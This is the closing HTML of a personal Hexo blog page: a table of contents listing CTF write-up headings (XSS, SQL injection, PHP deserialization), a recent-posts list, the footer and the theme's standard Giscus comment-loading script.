href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E7%9C%81%E6%B5%81%EF%BC%9A%E6%9C%89%E8%BF%99%E6%A0%B7%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AD%98%E6%94%BE%E5%9C%A8%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E7%BA%AF%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%91%8A%E7%9F%A5%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%88%AC%E8%99%AB%E5%93%AA%E4%BA%9B%E9%A1%B5%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%8F%96%EF%BC%8C%E5%93%AA%E4%BA%9B%E9%A1%B5%E9%9D%A2%E4%B8%8D%E5%BA%94%E8%A2%AB%E6%8A%93%E5%8F%96%E3%80%82%E5%AE%83%E6%98%AF%E7%BD%91%E7%AB%99%E4%B8%8E%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E9%97%B4%E7%9A%84-%E2%80%9C%E5%8D%8F%E8%AE%AE%E2%80%9D%EF%BC%8C%E5%B8%AE%E5%8A%A9%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86%E7%88%AC%E8%99%AB%E7%9A%84%E8%AE%BF%E9%97%AE%E8%A1%8C%E4%B8%BA%EF%BC%8C%E4%BF%9D%E6%8A%A4%E9%9A%90%E7%A7%81%E5%86%85%E5%AE%B9%E3%80%81%E8%8A%82%E7%9C%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E6%88%96%E5%BC%95%E5%AF%BC%E7%88%AC%E8%99%AB%E4%BC%98%E5%85%88%E6%8A%93%E5%8F%96%E9%87%8D%E8%A6%81%E9%A1%B5%E9%9D%A2%E3%80%82"><span class="toc-number">25.4.1.</span> <span class="toc-text">题目：省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎爬虫哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">25.5.</span> <span class="toc-text">PHP 反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moectf-web-09-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="toc-number">25.6.</span> <span class="toc-text">moectf web 09 第九章 星墟禁制·天机问路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="toc-number">25.7.</span> <span class="toc-text">17 第十七章 星骸迷阵·神念重构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">25.7.1.</span> <span class="toc-text">解题思路：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-%E4%B8%87%E5%8D%B7%E8%AF%A1%E9%98%81%C2%B7%E5%8A%9F%E6%B3%95%E8%BF%9E%E7%8E%AF"><span class="toc-number">25.8.</span> <span class="toc-text">18 第十八章 万卷诡阁·功法连环</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-%E6%98%9F%E7%A9%B9%E7%9C%9F%E7%9B%B8%C2%B7%E8%A1%A5%E5%A4%A9%E5%BD%92%E6%BA%90"><span class="toc-number">25.9.</span> <span class="toc-text">19 第十九章 星穹真相·补天归源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-5%E9%A2%98%E8%A7%A3"><span class="toc-number">25.10.</span> <span class="toc-text">sqli-5题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">26.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-web%E8%BF%9B%E9%98%B6-XSS%E9%97%AF%E5%85%B3-1"><span class="toc-number">26.1.</span> <span class="toc-text">[第二章 web进阶]XSS闯关 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">26.2.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="toc-number">26.2.1.</span> <span class="toc-text">第一关：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="toc-number">26.2.2.</span> <span class="toc-text">第二关：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="toc-number">26.3.</span> <span class="toc-text">11 第十一章 千机变·破妄之眼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">26.4.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-number">26.4.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">26.4.2.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="无标题">无标题</a><time datetime="2026-01-28T07:13:34.441Z" title="发表于 2026-01-28 15:13:34">2026-01-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="无标题">无标题</a><time datetime="2026-01-28T07:12:58.899Z" title="发表于 2026-01-28 15:12:58">2026-01-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/66b634a7.html" title="my-article">my-article</a><time datetime="2026-01-23T03:41:18.000Z" title="发表于 2026-01-23 11:41:18">2026-01-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2b37188e.html" title="codetijie">codetijie</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b7a1d97e.html" title="ssrf">ssrf</a><time datetime="2026-01-21T11:56:05.000Z" title="发表于 2026-01-21 19:56:05">2026-01-21</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By qyt</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': '2829750658t-svg/2829750658t-svg.github.io',
+      'data-repo-id': 'R_kgDOQS61dQ',
+      'data-category-id': 'DIC_kwDOQS61dc4C1UR-',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
